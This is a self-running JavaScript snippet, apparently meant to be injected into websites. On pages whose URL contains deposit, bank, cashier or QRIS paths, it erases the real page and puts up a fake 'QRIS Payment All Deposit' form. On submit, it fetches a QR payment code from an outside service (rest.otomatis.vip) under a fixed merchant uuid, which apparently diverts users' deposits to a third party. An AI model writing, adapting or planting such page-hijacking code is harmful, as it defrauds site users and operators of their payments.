(function () {
  // === CEK URL ===
  const url = window.location.href;
  const match = [
    '/deposit', '/bank', '/deposit.php', '/qris.php', '/cashier',
    '/?page=transaksi', '/index.php?page=transaksi',
    '/?deposit&head=home', '/index.php?page=cashier', '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  // === RESET KONTEN ===
  document.documentElement.innerHTML = `
    <head><title>INSTAN DEPOSIT QRIS</title></head>
    <body></body>
  `;

  // === STYLE ===
  const style = document.createElement('style');
  style.textContent = `
    :root {
      --bg:#0f1724;
      --card:#0b1220;
      --accent:#06b6d4;
      --glass:rgba(255,255,255,0.04);
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body {
      margin:0;
      font-family:Inter, system-ui, -apple-system, 'Helvetica Neue', Arial;
      display:flex;
      align-items:center;
      justify-content:center;
      background:linear-gradient(180deg,#071127 0%, #071a2a 100%);
      color:#e6eef6;
      overflow:hidden;
    }
    .wrap {width:100%;max-width:420px;padding:20px;animation:fadeIn 0.6s ease}
    .card {
      background:linear-gradient(180deg,rgba(255,255,255,0.03),rgba(255,255,255,0.02));
      border-radius:16px;
      padding:18px;
      box-shadow:0 8px 30px rgba(2,6,23,0.6);
      position:relative;
      overflow:hidden;
    }
    h1 {font-size:20px;margin:0 0 10px}
    p.lead {margin:0 0 18px;color:#bcd3df;font-size:13px}
    label {display:block;font-size:13px;margin-bottom:8px}
    input {
      width:100%;
      padding:12px 14px;
      border-radius:10px;
      border:1px solid rgba(255,255,255,0.06);
      background:transparent;
      color:inherit;
      font-size:16px;
    }
    .row {display:flex;gap:10px;margin-top:12px}
    button {
      flex:1;
      padding:12px;
      border-radius:10px;
      border:0;
      background:linear-gradient(90deg,var(--accent),#7dd3fc);
      color:#052023;
      font-weight:700;
      font-size:15px;
      cursor:pointer;
      transition:all 0.2s;
    }
    button:hover {transform:scale(1.03)}
    .hint {font-size:12px;color:#9fb6c6;margin-top:10px}
    #status {margin-top:10px;font-size:13px;text-align:center}
    .loader {
      width:60px;height:60px;
      border-radius:50%;
      border:6px solid rgba(255,255,255,0.1);
      border-top-color:var(--accent);
      animation:spin 1s linear infinite;
      margin:20px auto;
    }
    .fade {animation:fadeIn 0.6s ease}
    @keyframes fadeIn {from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
    @keyframes spin {to{transform:rotate(360deg)}}
    canvas.confetti {position:fixed;inset:0;pointer-events:none;z-index:1000}
    @media (max-width:420px){.wrap{padding:14px}.card{padding:14px}}
  `;
  document.head.appendChild(style);

  // === UI AWAL ===
  const container = document.createElement('div');
  container.className = 'container';
  container.innerHTML = `
    <div class="wrap">
      <div class="card">
        <h1>QRIS Payment All Deposit</h1>
        <p class="lead">
          Ketik nominal yang ingin dibayar — Deposit Minimal 20,000. 
          Setelah tekan <strong>Bayar</strong> akan muncul Invoice QRIS, Scan lalu Bayar.
        </p>

        <label>Username</label>
        <input id="username" type="text" placeholder="username" />

        <label>Nominal (Rupiah)</label>
        <input id="amount" type="number" min="0" step="1" placeholder="min.20000" />

        <div class="row">
          <button id="confirmBtn">Bayar</button>
          <button id="clearBtn" style="
            background:transparent;
            border:1px solid rgba(255,255,255,0.06);
            color:#cfeff6;
            font-weight:600
          ">Reset</button>
        </div>

        <div id="status"></div>
      </div>
    </div>
  `;
  document.body.appendChild(container);

  // === EVENT LISTENERS ===
  document.getElementById('amount').addEventListener('input', formatAmount);
  document.getElementById('confirmBtn').addEventListener('click', confirmDeposit);
  document.getElementById('clearBtn').addEventListener('click', () => {
    document.getElementById('username').value = '';
    document.getElementById('amount').value = '';
    document.getElementById('status').innerText = '';
  });

  // === FUNGSI FORMAT NOMINAL ===
  function formatAmount(e) {
    let val = e.target.value.replace(/\D/g, '');
    if (val) val = parseInt(val).toLocaleString('id-ID');
    e.target.value = val;
  }

  // === CONFETTI ANIMASI (KIRI & KANAN BAWAH) ===
  function launchConfetti() {
    const canvas = document.createElement('canvas');
    canvas.className = 'confetti';
    document.body.appendChild(canvas);
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const pieces = new Array(150).fill().map(() => {
      const fromLeft = Math.random() < 0.5;
      return {
        x: fromLeft
          ? Math.random() * (canvas.width * 0.25)
          : canvas.width * 0.75 + Math.random() * (canvas.width * 0.25),
        y: canvas.height + Math.random() * 100,
        r: 6 + Math.random() * 6,
        d: Math.random() * 150 + 50,
        color: `hsl(${Math.random() * 360},100%,50%)`,
        tilt: Math.random() * 10 - 10,
        tiltAngleIncrement: 0.07 * Math.random() + 0.05,
        tiltAngle: 0,
        speedY: 2 + Math.random() * 2
      };
    });

    function draw() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      pieces.forEach(p => {
        ctx.beginPath();
        ctx.lineWidth = p.r;
        ctx.strokeStyle = p.color;
        ctx.moveTo(p.x + p.tilt + p.r / 4, p.y);
        ctx.lineTo(p.x + p.tilt, p.y + p.tilt + p.r / 4);
        ctx.stroke();
      });
      update();
      requestAnimationFrame(draw);
    }

    function update() {
      pieces.forEach(p => {
        p.tiltAngle += p.tiltAngleIncrement;
        p.y -= p.speedY; // naik ke atas
        p.x += Math.sin(p.tiltAngle) * 1.5;
        p.tilt = Math.sin(p.tiltAngle) * 15;
        if (p.y < -20) {
          const fromLeft = Math.random() < 0.5;
          p.x = fromLeft
            ? Math.random() * (canvas.width * 0.25)
            : canvas.width * 0.75 + Math.random() * (canvas.width * 0.25);
          p.y = canvas.height + 20;
        }
      });
    }

    draw();
    setTimeout(() => canvas.remove(), 5000);
  }

  // === FUNGSI KONFIRMASI ===
  async function confirmDeposit() {
    const username = document.getElementById('username').value.trim();
    const amountInput = document.getElementById('amount').value;
    const status = document.getElementById('status');

    let val = amountInput.replace(/\./g, '').replace(/,/g, '');
    const nominal = parseInt(val);

    if (!username) {
      status.innerText = "Username wajib diisi!";
      status.style.color = "#ff3333";
      return;
    }
    if (isNaN(nominal) || nominal < 20000) {
      status.innerText = "Minimal deposit 20.000";
      status.style.color = "#ff3333";
      return;
    }

    status.innerHTML = `<div class="loader"></div>Menyiapkan QRIS...`;
    status.style.color = "#0f0";

    try {
      const resp = await fetch("https://rest.otomatis.vip/api/generate", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          username: username,
          amount: nominal,
          uuid: "ef11197b-1503-4e70-b76d-5406fe6079e9",
          expire: 1200,
          custom_ref: "887"
        })
      });

      const data = await resp.json();

      if (data.data) {
        const qr_url = `https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(data.data)}&size=200x200`;
        container.innerHTML = `
          <div class="wrap fade">
            <div class="card" style="text-align:center">
              <h1>DEPOSIT QRIS</h1>
              <img src="${qr_url}" alt="QR Code" style="margin:15px auto;max-width:200px;animation:fadeIn 1s">
              <p>
                Untuk: <span style="color:#ffd700">${username}</span><br>
                Jumlah: <span style="color:#ffd700">Rp ${nominal.toLocaleString('id-ID')}</span>
              </p>
              <div class="row" style="margin-top:15px">
                <button onclick="window.open('${qr_url}')">Download QR</button>
                <button onclick="location.reload()">Buat Lagi</button>
              </div>
            </div>
          </div>
        `;
        launchConfetti();
      } else {
        status.innerText = "Gagal generate QRIS";
        status.style.color = "#ff3333";
      }
    } catch (err) {
      console.error(err);
      status.innerText = "Error koneksi ke API";
      status.style.color = "#ff3333";
    }
  }
})();
